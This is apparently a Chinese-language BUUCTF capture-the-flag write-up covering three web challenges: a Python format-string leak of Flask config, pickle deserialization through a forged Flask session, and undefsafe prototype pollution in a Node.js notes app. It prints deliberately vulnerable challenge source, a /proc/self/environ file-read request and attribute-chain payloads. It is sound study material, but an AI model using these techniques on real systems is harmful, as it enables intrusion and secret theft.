---
title: "BUUCTF Web Writeup 11"
date: 2022-12-24T20:50:44+08:00
lastmod: 2022-12-24T20:50:44+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [FBCTF2019]Event

python 格式化字符串漏洞

[https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)

[https://www.anquanke.com/post/id/170620](https://www.anquanke.com/post/id/170620)

![image-20230105124441142](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051244215.png)

![image-20230105124534727](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051245760.png)

然后通过命名空间找到 flask app config

```python
__class__.__init__.__globals__
__class__.__init__.__globals__[app]
__class__.__init__.__globals__[app].config
```

注意这里中括号里面不能带引号, 原因如下

![image-20230105124737670](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051247844.png)

![image-20230105124755912](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051247012.png)

![image-20230105124820212](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051248258.png)

最后用 flask-unsign 构造 session

![image-20230105124844963](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051248176.png)

![image-20230105124903930](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051249015.png)

题目源码

[https://github.com/fbsamples/fbctf-2019-challenges/blob/main/web/events/app/app.py](https://github.com/fbsamples/fbctf-2019-challenges/blob/main/web/events/app/app.py)

![image-20230105125242507](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051252560.png)

最下面还有一个 `e.fmt.format(e)`

其实就是第一次格式化的 fmt 内容可控, 然后通过这个 fmt 第二次 format, 造成了字符串格式化漏洞

有点类似二次注入的感觉

`0` 占位符表示的是 Event 对象

![image-20230105125335149](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051253176.png)

## [HFCTF 2021 Final]easyflask

```
eyJ1Ijp7ImIiOnsiIGIiOiJXVEk1ZWtOdVRqVmpNMUpzWWxGdmIxVjVaR3BrV0VwelNVUkZkVTFVUlROTWFtTjNUR3BKZWsxRWJ6Sk9WRkV3VGtOQmRGWkRRWFphYlhob1dubGpTMlJHU1hVPSJ9fX0.Y7ZsAQ.Zl4J8Bacz5rcF2odUyAcD3UCQmc
```

```python

#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):
            u = b64decode(u.get('b'))
        u = pickle.loads(u)
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)
```

简单 pickle 反序列化

```
http://183edc6a-3426-40de-bef6-f395e53deb8e.node4.buuoj.cn:81/file?file=/proc/self/environ
```

![image-20230105142045706](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051420748.png)

构造 payload

![image-20230105142212865](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051422968.png)

![image-20230105142140005](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051421124.png)

![image-20230105142226550](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051422610.png)

![image-20230105142249467](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051422493.png)

## [网鼎杯 2020 青龙组]notes

```javascript
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');


var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});

app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
```

一眼原型链污染

undefsafe CVE-2019-10795

[https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940](https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)

![image-20230105162319558](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051623627.png)

![image-20230105162333248](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051623314.png)

![image-20230105162339802](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051623868.png)

![image-20230105162357786](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202301051623816.png)

## [CISCN2019 华东北赛区]Web2



